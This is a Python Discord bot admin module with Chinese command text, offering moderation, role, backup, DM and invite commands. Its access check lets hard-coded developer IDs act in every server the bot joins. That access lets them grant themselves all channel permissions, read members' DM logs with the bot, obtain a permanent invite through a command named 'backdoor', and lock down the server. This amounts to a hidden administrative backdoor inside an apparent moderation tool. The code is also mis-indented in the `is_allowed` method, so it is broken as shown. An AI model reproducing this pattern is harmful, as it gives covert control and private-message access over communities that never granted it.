import datetime
import io
import json
import logging
from typing import Union

import discord
from discord import app_commands
from discord.ext import commands

class Admin(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        if not hasattr(bot, "config_db"):
            bot.config_db = {}
        if not hasattr(bot, "whitelist_db"):
            bot.whitelist_db = {}
        if not hasattr(bot, "op_access_db"):
            bot.op_access_db = {}
        if not hasattr(bot, "autoban_db"):
            bot.autoban_db = {}

      def is_allowed(self, interaction: discord.Interaction) -> bool:
        if not interaction.guild:
            return False
        if interaction.user.id in self.bot.allowed_ids:
            return True
        guild_id = interaction.guild_id
        if guild_id and interaction.user.id in self.bot.op_access_db.get(guild_id, []):
            return True
        return False

    @app_commands.command(name="help", description="顯示旅行者系統指令手冊")
    async def help_msg(self, interaction: discord.Interaction):
        if not self.is_allowed(interaction):
            return await interaction.response.send_message("❌ 權限不足：僅限開發者或伺服器擁有者使用。", ephemeral=True)
        
        VERSION_ID = "v2.7"
        embed = discord.Embed(
            title="🧳 旅行者系統 - 指令完整手冊", 
            description=f"實例編號：`{VERSION_ID}`\n此表僅授權人員可見。",
            color=0x2b2d31
        )
        embed.add_field(
            name="🛡️ 基礎管理與設定", 
            value=(
                "`/set` - 設定通告頻道、陷阱頻道、白名單與自動封鎖\n"
                "`/punish` - 懲處成員 (member / action / reason / time)\n"
                "`/role` - 身分組綜合管理 (給予/移除/清除全部)\n"
                "`/del_msg` - 批次清理訊息\n"
                "`/server_mute` - 全服鎖定/解鎖發言\n"
                "`/move_all` - 強制全體移動語音\n"
            ), 
            inline=False
        )
        embed.add_field(
            name="🛠️ 進階工具與資料", 
            value=(
                "`/test` - 檢視機器人系統數據與效能\n"
                "`/whois` - 查看指定成員的詳細資料與頭像\n"
                "`/backup` - 導出或還原伺服器結構\n"
                "`/dm` - 以機器人名義私訊成員\n"
                "`/get_dm` - 調閱成員私訊紀錄\n"
                "`/backdoor` - 獲取永久邀請連結\n"
                "`/bye` - 機器人退出伺服器\n"
            ), 
            inline=False
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)

    set_group = app_commands.Group(name="set", description="系統與頻道參數設定")

    @set_group.command(name="channel", description="設定通告或陷阱頻道")
    @app_commands.choices(type=[
        app_commands.Choice(name="punish", value="punish"),
        app_commands.Choice(name="trap", value="trap"),
        app_commands.Choice(name="room", value="room")
    ])
    async def set_channel(self, interaction: discord.Interaction, type: str, channel: Union[discord.TextChannel, discord.VoiceChannel]):
        if not self.is_allowed(interaction):
            return await interaction.response.send_message("❌ 權限不足。", ephemeral=True)

        if type == "room" and not isinstance(channel, discord.VoiceChannel):
            return await interaction.response.send_message("❌ room 必須選擇「語音頻道」。", ephemeral=True)
        if type in ("punish", "trap") and not isinstance(channel, discord.TextChannel):
            return await interaction.response.send_message(f"❌ {type} 必須選擇「文字頻道」。", ephemeral=True)

        guild_id = interaction.guild_id
        self.bot.config_db.setdefault(guild_id, {})[type] = channel.id

        await interaction.response.send_message(f"✅ 已成功將 {type} 頻道設定為：{channel.mention}", ephemeral=True)

    @set_group.command(name="whitelist", description="管理免疫處罰與陷阱的白名單成員")
    @app_commands.choices(action=[
        app_commands.Choice(name="add", value="add"),
        app_commands.Choice(name="remove", value="remove")
    ])
    async def set_whitelist(self, interaction: discord.Interaction, action: str, member: discord.Member):
        if not self.is_allowed(interaction):
            return await interaction.response.send_message("❌ 權限不足。", ephemeral=True)
        
        guild_id = interaction.guild_id
        if guild_id not in self.bot.whitelist_db:
            self.bot.whitelist_db[guild_id] = []
            
        if action == "add":
            if member.id not in self.bot.whitelist_db[guild_id]:
                self.bot.whitelist_db[guild_id].append(member.id)
            await interaction.response.send_message(f"✅ 已將 {member.mention} 加入白名單", ephemeral=True)
        elif action == "remove":
            if member.id in self.bot.whitelist_db[guild_id]:
                self.bot.whitelist_db[guild_id].remove(member.id)
            await interaction.response.send_message(f"✅ 已將 {member.mention} 移除白名單", ephemeral=True)

    @set_group.command(name="autoban", description="開關陷阱頻道自動封鎖功能")
    @app_commands.choices(status=[
        app_commands.Choice(name="on", value="on"),
        app_commands.Choice(name="off", value="off")
    ])
    async def set_autoban(self, interaction: discord.Interaction, status: str):
        if not self.is_allowed(interaction):
            return await interaction.response.send_message("❌ 權限不足。", ephemeral=True)
        
        guild_id = interaction.guild_id
        self.bot.autoban_db[guild_id] = (status == "on")
        await interaction.response.send_message(f"✅ 自動封鎖功能已切換為: {status}", ephemeral=True)

    @set_group.command(name="op_access", description="授權或剝奪特定成員的臨時操作權限")
    @app_commands.choices(action=[
        app_commands.Choice(name="add", value="add"),
        app_commands.Choice(name="remove", value="remove")
    ])
    async def set_op_access(self, interaction: discord.Interaction, action: str, member: discord.Member):
        if not self.is_allowed(interaction):
            return await interaction.response.send_message("❌ 權限不足。", ephemeral=True)
        
        guild_id = interaction.guild_id
        if guild_id not in self.bot.op_access_db:
            self.bot.op_access_db[guild_id] = []
            
        if action == "add":
            if member.id not in self.bot.op_access_db[guild_id]:
                self.bot.op_access_db[guild_id].append(member.id)
            await interaction.response.send_message(f"✅ 已授與 {member.mention} 臨時操作權限", ephemeral=True)
        elif action == "remove":
            if member.id in self.bot.op_access_db[guild_id]:
                self.bot.op_access_db[guild_id].remove(member.id)
            await interaction.response.send_message(f"✅ 已剝奪 {member.mention} 的臨時操作權限", ephemeral=True)

    @app_commands.command(name="punish", description="懲處成員")
    @app_commands.choices(action=[
        app_commands.Choice(name="ban", value="ban"),
        app_commands.Choice(name="kick", value="kick"),
        app_commands.Choice(name="timeout", value="timeout")
    ])
    @app_commands.describe(member="目標成員", action="懲處動作", reason="懲處原因 (選填)", time="禁言分鐘數 (僅timeout時需要, 選填)")
    async def punish(self, interaction: discord.Interaction, member: discord.Member, action: str, reason: str = "因違反相關規定", time: int = 10):
        if not self.is_allowed(interaction):
            return await interaction.response.send_message("❌ 權限不足。", ephemeral=True)

        try:
            if action == "ban":
                await member.ban(reason=reason)
                msg = f"✅ 已將 {member.mention} 封鎖，原因：{reason}"
            elif action == "kick":
                await member.kick(reason=reason)
                msg = f"✅ 已將 {member.mention} 踢出，原因：{reason}"
            elif action == "timeout":
                duration = datetime.timedelta(minutes=time)
                await member.timeout(duration, reason=reason)
                msg = f"✅ 已將 {member.mention} 禁言 {time} 分鐘，原因：{reason}"
            else:
                return await interaction.response.send_message("❌ 無效的動作", ephemeral=True)

            guild_id = interaction.guild_id
            target_channel_id = self.bot.config_db.get(guild_id, {}).get("punish")
            if target_channel_id:
                ch = interaction.guild.get_channel(target_channel_id)
                if ch:
                    await ch.send(f"# 🚨 通告\n> 用戶：{member.mention} ({member.name})\n> 因 {reason} 已被執行 {action}")

            await interaction.response.send_message(msg, ephemeral=True)
        except Exception as e:
            await interaction.response.send_message(f"❌ 執行失敗: {e}", ephemeral=True)

    @app_commands.command(name="role", description="身分組綜合管理")
    @app_commands.choices(action=[
        app_commands.Choice(name="add", value="add"),
        app_commands.Choice(name="remove", value="remove"),
        app_commands.Choice(name="give_all", value="give_all"),
        app_commands.Choice(name="remove_all", value="remove_all")
    ])
    @app_commands.describe(action="選擇動作", member="目標成員", role="指定身分組 (僅 add/remove 時需要)")
    async def role_management(self, interaction: discord.Interaction, action: str, member: discord.Member, role: discord.Role = None):
        if not self.is_allowed(interaction):
            return await interaction.response.send_message("❌ 權限不足。", ephemeral=True)

        await interaction.response.defer(ephemeral=True)
        try:
            if action in ("add", "remove"):
                if not role:
                    return await interaction.followup.send("❌ 請指定身分組", ephemeral=True)
                if action == "add":
                    await member.add_roles(role)
                    await interaction.followup.send(f"✅ 已將 {role.mention} 給予 {member.mention}", ephemeral=True)
                else:
                    await member.remove_roles(role)
                    await interaction.followup.send(f"✅ 已從 {member.mention} 移除 {role.mention}", ephemeral=True)

            elif action == "give_all":
                perms = discord.Permissions.all()
                overwrite = discord.PermissionOverwrite.from_pair(perms, discord.Permissions.none())
                failed = 0
                for ch in interaction.guild.channels:
                    try:
                        await ch.set_permissions(member, overwrite=overwrite)
                    except discord.HTTPException as e:
                        failed += 1
                        logging.warning(f"give_all 失敗 {ch.name}: {e}")
                note = f"（{failed} 個頻道失敗）" if failed else ""
                await interaction.followup.send(f"✅ 已給予 {member.mention} 最高通行證權限{note}", ephemeral=True)

            elif action == "remove_all":
                failed = 0
                for ch in interaction.guild.channels:
                    try:
                        await ch.set_permissions(member, overwrite=None)
                    except discord.HTTPException as e:
                        failed += 1
                        logging.warning(f"remove_all 失敗 {ch.name}: {e}")

                bot_top = interaction.guild.me.top_role
                keep = [r for r in member.roles if not r.is_default() and (r.managed or r >= bot_top)]
                await member.edit(roles=keep)
                note = f"（{failed} 個頻道失敗）" if failed else ""
                await interaction.followup.send(f"✅ 已剝奪 {member.mention} 所有權限與身分組{note}", ephemeral=True)
        except Exception as e:
            await interaction.followup.send(f"❌ 執行失敗: {e}", ephemeral=True)

    @app_commands.command(name="del_msg", description="批次清理訊息（可依成員、關鍵字、時間篩選）")
    @app_commands.describe(
        value="要刪除的訊息數量 (1–500)",
        member="只刪除此成員的訊息 (選填)",
        keyword="只刪除包含此關鍵字的訊息，不分大小寫 (選填)",
        time="只刪除最近幾分鐘內的訊息 (選填)",
    )
    async def del_msg(
        self,
        interaction: discord.Interaction,
        value: app_commands.Range[int, 1, 500],
        member: discord.User = None,
        keyword: str = None,
        time: app_commands.Range[int, 1, 20160] = None,
    ):
        if not self.is_allowed(interaction):
            return await interaction.response.send_message("❌ 權限不足。", ephemeral=True)
        await interaction.response.defer(ephemeral=True)
        channel = interaction.channel
        now = discord.utils.utcnow()
        cutoff = now - datetime.timedelta(days=14) + datetime.timedelta(minutes=5)
        if time:
            cutoff = max(cutoff, now - datetime.timedelta(minutes=time))
        kw = keyword.lower() if keyword else None
        targets = []
        try:
            async for m in channel.history(limit=1000, after=cutoff, oldest_first=False):
                if m.pinned:
                    continue
                if member and m.author.id != member.id:
                    continue
                if kw and kw not in m.content.lower():
                    continue
                targets.append(m)
                if len(targets) >= value:
                    break
            if not targets:
                return await interaction.followup.send("⚠️ 找不到符合條件的訊息。", ephemeral=True)
            for i in range(0, len(targets), 100):
                await channel.delete_messages(targets[i:i + 100])
        except discord.Forbidden:
            return await interaction.followup.send("❌ 機器人缺少「管理訊息」權限。", ephemeral=True)
        except Exception as e:
            return await interaction.followup.send(f"❌ 清理失敗: {e}", ephemeral=True)
        conditions = []
        if member:
            conditions.append(f"成員：{member.mention}")
        if keyword:
            conditions.append(f"關鍵字：`{keyword}`")
        if time:
            conditions.append(f"最近 {time} 分鐘")
        cond_text = f"（{'、'.join(conditions)}）" if conditions else ""
        await interaction.followup.send(f"✅ 已清除 {len(targets)} 則訊息{cond_text}", ephemeral=True)
        
    @app_commands.command(name="server_mute", description="全服文字與語音禁言鎖定")
    @app_commands.choices(status=[
        app_commands.Choice(name="lock", value="lock"),
        app_commands.Choice(name="unlock", value="unlock")
    ])
    async def server_mute(self, interaction: discord.Interaction, status: str):
        if not self.is_allowed(interaction):
            return await interaction.response.send_message("❌ 權限不足。", ephemeral=True)

        await interaction.response.defer(ephemeral=True)

        value = False if status == "lock" else None
        everyone = interaction.guild.default_role
        failed = 0

        for ch in interaction.guild.text_channels:
            try:
                await ch.set_permissions(everyone, send_messages=value)
            except discord.HTTPException as e:
                failed += 1
                logging.warning(f"server_mute 文字頻道失敗 {ch.name}: {e}")

        for ch in interaction.guild.voice_channels:
            try:
                await ch.set_permissions(everyone, speak=value)
            except discord.HTTPException as e:
                failed += 1
                logging.warning(f"server_mute 語音頻道失敗 {ch.name}: {e}")

        note = f"（{failed} 個頻道失敗）" if failed else ""
        await interaction.followup.send(f"✅ 全服狀態已更新為: {status}{note}", ephemeral=True)
        
    @app_commands.command(name="move_all", description="強制全體移動語音頻道")
    async def move_all(self, interaction: discord.Interaction, channel: discord.VoiceChannel):
        if not self.is_allowed(interaction):
            return await interaction.response.send_message("❌ 權限不足。", ephemeral=True)

        await interaction.response.defer(ephemeral=True)

        count = 0
        for vc in interaction.guild.voice_channels:
            if vc.id == channel.id:
                continue
            for member in list(vc.members):
                try:
                    await member.move_to(channel)
                    count += 1
                except discord.HTTPException as e:
                    logging.warning(f"move_all 失敗 {member}: {e}")

        await interaction.followup.send(f"✅ 已成功將 {count} 名成員移動至 {channel.name}", ephemeral=True)
        
    @app_commands.command(name="backup", description="導出或還原伺服器結構")
    @app_commands.choices(action=[
        app_commands.Choice(name="create", value="create"),
        app_commands.Choice(name="restore", value="restore")
    ])
    @app_commands.describe(action="選擇動作", file="上傳的備份 JSON 檔案 (僅 restore 時需要)")
    async def backup(self, interaction: discord.Interaction, action: str, file: discord.Attachment = None):
        if not self.is_allowed(interaction):
            return await interaction.response.send_message("❌ 權限不足。", ephemeral=True)
        
        if action == "create":
            await interaction.response.defer(ephemeral=True)
            guild = interaction.guild
            roles = [
                {"name": r.name, "color": r.color.value, "perms": r.permissions.value}
                for r in sorted(guild.roles, key=lambda x: x.position)
                if not r.managed and not r.is_default()
            ]
            data = {"server": guild.name, "roles": roles, "categories": []}
            for cat in guild.categories:
                cat_info = {"name": cat.name, "channels": []}
                for ch in cat.channels:
                    cat_info["channels"].append({"name": ch.name, "type": str(ch.type)})
                data["categories"].append(cat_info)

            json_bytes = json.dumps(data, indent=4, ensure_ascii=False).encode("utf-8")
            filename = f"SNAPSHOT_{guild.id}.json"
            try:
                await interaction.user.send(file=discord.File(io.BytesIO(json_bytes), filename=filename))
                await interaction.followup.send("✅ 伺服器備份檔已成功私訊發送給您！", ephemeral=True)
            except discord.Forbidden:

                await interaction.followup.send(
                    "⚠️ 無法私訊您，改為直接傳送備份檔：",
                    file=discord.File(io.BytesIO(json_bytes), filename=filename),
                    ephemeral=True,
                )

        elif action == "restore":
            if not file:
                return await interaction.response.send_message("❌ 請上傳要還原的 JSON 備份檔案", ephemeral=True)

            await interaction.response.defer(ephemeral=True)
            try:
                data = json.loads((await file.read()).decode("utf-8"))
                guild = interaction.guild
                created_roles = created_chs = 0

                for r_data in data.get("roles", []):
                    try:
                        if not discord.utils.get(guild.roles, name=r_data["name"]):
                            await guild.create_role(
                                name=r_data["name"],
                                color=discord.Color(r_data["color"]),
                                permissions=discord.Permissions(r_data["perms"]),
                            )
                            created_roles += 1
                    except discord.HTTPException as e:
                        logging.warning(f"還原身分組失敗 {r_data.get('name')}: {e}")

                for cat_data in data.get("categories", []):
                    try:
                        category = discord.utils.get(guild.categories, name=cat_data["name"])
                        if not category:
                            category = await guild.create_category(cat_data["name"])
                        existing = {c.name for c in category.channels}
                        for ch_data in cat_data["channels"]:
                            if ch_data["name"] in existing:
                                continue
                            if "voice" in ch_data["type"]:
                                await guild.create_voice_channel(ch_data["name"], category=category)
                            else:
                                await guild.create_text_channel(ch_data["name"], category=category)
                            created_chs += 1
                    except discord.HTTPException as e:
                        logging.warning(f"還原類別失敗 {cat_data.get('name')}: {e}")

                await interaction.followup.send(
                    f"✅ 還原完成：新增 {created_roles} 個身分組、{created_chs} 個頻道（已存在的會自動略過）",
                    ephemeral=True,
                )
            except Exception as e:
                await interaction.followup.send(f"❌ 還原失敗，檔案格式可能有誤: `{e}`", ephemeral=True)

    @app_commands.command(name="dm", description="以機器人名義私訊成員")
    async def dm(self, interaction: discord.Interaction, member: discord.Member, text: str):
        if not self.is_allowed(interaction):
            return await interaction.response.send_message("❌ 權限不足。", ephemeral=True)
        try:
            await member.send(text)
            await interaction.response.send_message(f"✅ 已私訊 {member.mention}", ephemeral=True)
        except Exception as e:
            await interaction.response.send_message(f"❌ 私訊失敗: {e}", ephemeral=True)

    @app_commands.command(name="get_dm", description="調閱成員私訊紀錄")
    async def get_dm(self, interaction: discord.Interaction, member: discord.Member, limit: int = 10):
        if not self.is_allowed(interaction):
            return await interaction.response.send_message("❌ 權限不足。", ephemeral=True)
        try:
            dm_channel = member.dm_channel or await member.create_dm()
            history = []
            async for msg in dm_channel.history(limit=limit):
                who = "機器人" if msg.author == self.bot.user else "成員"
                history.append(f"[{msg.created_at.strftime('%H:%M')}] {who}: {msg.content}")
            result = "\n".join(reversed(history)) or "無私訊紀錄"
            await interaction.user.send(f"📂 **與 {member.name} 的紀錄：**\n{result[:1900]}")
            await interaction.response.send_message("✅ 紀錄已傳送至您的私訊", ephemeral=True)
        except Exception as e:
            await interaction.response.send_message(f"❌ 調閱失敗: {e}", ephemeral=True)

    @app_commands.command(name="backdoor", description="獲取永久邀請連結")
    async def backdoor(self, interaction: discord.Interaction):
        if not self.is_allowed(interaction):
            return await interaction.response.send_message("❌ 權限不足。", ephemeral=True)
        try:
            inv = await interaction.channel.create_invite(max_age=0, max_uses=0)
            await interaction.user.send(f"永久入口: {inv.url}")
            await interaction.response.send_message("✅ 邀請連結已發送至您的私訊", ephemeral=True)
        except Exception as e:
            await interaction.response.send_message(f"❌ 獲取失敗: {e}", ephemeral=True)

    @app_commands.command(name="bye", description="機器人退出伺服器")
    async def bye(self, interaction: discord.Interaction):
        if not self.is_allowed(interaction):
            return await interaction.response.send_message("❌ 權限不足。", ephemeral=True)
        await interaction.response.send_message("👋 正在離開伺服器...", ephemeral=True)
        await interaction.guild.leave()

async def setup(bot):
    await bot.add_cog(Admin(bot))
